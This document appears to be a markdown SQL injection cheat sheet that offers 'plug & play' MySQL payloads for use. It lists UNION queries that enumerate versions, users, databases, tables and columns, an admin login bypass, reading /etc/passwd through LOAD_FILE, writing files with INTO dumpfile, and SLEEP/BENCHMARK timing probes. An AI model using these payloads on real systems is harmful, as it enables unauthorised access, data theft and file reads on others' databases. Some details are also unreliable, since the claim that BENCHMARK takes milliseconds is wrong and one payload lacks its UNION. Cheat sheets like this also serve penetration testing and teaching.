# MySQL Cookbook

Plug & play injection queries for MySQL.

Keep in mind you may have to add or subtract columns in order to get union operations to work properly.

## Info Gathering

### Get MySQL version
`' UNION SELECT @@version; -- `

### Select server user
`' UNION SELECT user(); -- `

### Select system user
`' SELECT system_user(); -- `

### Get current database
`' UNION SELECT database(); -- `

### Get hostname
`' UNION SELECT @@hostname; -- `

### Get all databases on server (for MySQL v5+)
`' UNION SELECT schema_name FROM information_schema.schemata; -- `

### Get columns across all databases
`' UNION SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema'; -- `

### Get all tables in database
`' UNION SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema'; -- `

### Find table by name of column
`' UNION SELECT table_schema, table_name FROM information_schema.columns WHERE column_name = 'username'; -- `

## Bypass authentication

### Log in as admin user
`admin' OR 1=1; -- `

## Local file access (requires DB admin privileges)
### Read file
`' UNION ALL SELECT LOAD_FILE('/etc/passwd'); -- `

### Write file
`SELECT * FROM some_table INTO dumpfile '/tmp/file_name';`

## Other

### Wait for time
`'; SELECT BENCHMARK(1000000,MD5('A')); -- `
`'; SELECT SLEEP(5) -- `
Note: the first accepts milliseconds. It should work for any version. The second works for v5.0.12.
